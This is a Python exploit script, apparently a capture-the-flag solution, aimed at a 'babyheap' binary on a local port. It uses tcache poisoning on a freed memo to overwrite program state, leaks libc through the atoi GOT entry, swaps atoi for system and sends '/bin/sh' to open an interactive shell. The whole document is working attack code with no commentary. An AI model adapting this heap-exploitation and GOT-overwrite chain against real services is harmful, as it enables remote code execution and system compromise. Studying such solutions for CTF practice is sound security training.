from ptrlib import *

def memo_create():
    sock.recvuntil("> ")
    sock.sendline("1")

def memo_edit(data):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.recvuntil("Content? ")
    sock.send(data)

def memo_show():
    sock.recvuntil("> ")
    sock.sendline("3")
    sock.recvuntil("Content: ")
    return sock.recvline()

def memo_delete():
    sock.recvuntil("> ")
    sock.sendline("4")

def memo_fill(data):
    sock.recvuntil("> ")
    sock.sendline("1337")
    sock.recvuntil("Fill ")
    sock.send(data)

elf = ELF("./babyheap")
libc = ELF("./libc-2.26.so")
sock = Socket("127.0.0.1", 2000)

memo_create()
memo_delete()
memo_edit(p64(0x6020a0))
memo_create()

payload = b''
payload += p64(0) # is_created
payload += p64(0) # is_edited
payload += p64(0) # is_shown
payload += p64(0) # is_deleted
payload += p64(0) # is_filled
payload += p64(elf.got("atoi")) # buf
memo_fill(payload)

addr_atoi = u64(memo_show()[:8].strip())
libc_base = addr_atoi - libc.symbol("atoi")
addr_system = libc_base + libc.symbol("system")
dump("libc base = " + hex(libc_base))

memo_edit(p64(addr_system))

sock.recvuntil("> ")
sock.send("/bin/sh\x00")
sock.interactive()
